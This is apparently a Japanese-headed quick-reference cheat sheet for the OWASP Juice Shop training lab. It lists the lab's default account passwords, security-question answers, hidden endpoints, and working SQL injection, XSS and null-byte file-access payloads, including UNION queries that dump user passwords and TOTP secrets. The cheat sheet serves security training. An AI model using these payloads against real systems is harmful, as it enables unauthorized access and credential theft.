# Quick Reference

## 認証情報

| Email | Password |
|-------|----------|
| admin@juice-sh.op | admin123 |
| jim@juice-sh.op | ncc-1701 |
| bender@juice-sh.op | OhG0dPlease1LubYou |
| mc.safesearch@juice-sh.op | Mr. N00dles |
| amy@juice-sh.op | K1f.................... |
| bjoern.kimminich@gmail.com | bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI= |

## SQLi ペイロード

```sql
' OR 1=1--                           -- 管理者ログイン
jim@juice-sh.op'--                   -- 特定ユーザー
' or deletedAt IS NOT NULL--         -- 削除済みユーザー
')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--
')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--
')) UNION SELECT id,email,password,totpsecret,5,6,7,8,9 FROM users--
```

## XSS ペイロード

```html
<iframe src="javascript:alert('xss')">
<<script>script>alert('xss')<</script>/script>
<img src=x onerror=alert(1)>
```

## セキュリティ質問

| Email | 質問 | 答え |
|-------|------|------|
| bjoern@owasp.org | ペットの名前 | Zaya |
| bender@juice-sh.op | 勤務先 | Stop'n'Drop |
| jim@juice-sh.op | 兄弟の名前 | Samuel |
| emma@juice-sh.op | 勤務先 | ITsec |
| john@juice-sh.op | 写真の場所 | Daniel Boone National Forest |
| uvogin@juice-sh.op | 好きな映画 | Silence of the Lambs |

## 主要エンドポイント

### フロントエンド
```
/#/login  /#/register  /#/search  /#/score-board
/#/administration  /#/complain  /#/forgot-password
/#/photo-wall  /#/web3-sandbox  /#/tokensale-ico-ea
```

### API
```
/api/Users  /api/Feedbacks  /api/Products  /api/Challenges
/rest/basket/{id}  /rest/captcha  /rest/products/search?q=
/rest/user/change-password  /rest/deluxe-membership
```

### 隠しリソース
```
/ftp  /metrics  /support/logs
/.well-known/csaf/provider-metadata.json
/.well-known/csaf/index.txt
```

## Poison Null Byte

`%2500` = URL エンコードされた `%00`

```
/ftp/package.json.bak%2500.md
/ftp/eastere.gg%2500.md
/ftp/coupons_2013.md.bak%2500.md
```
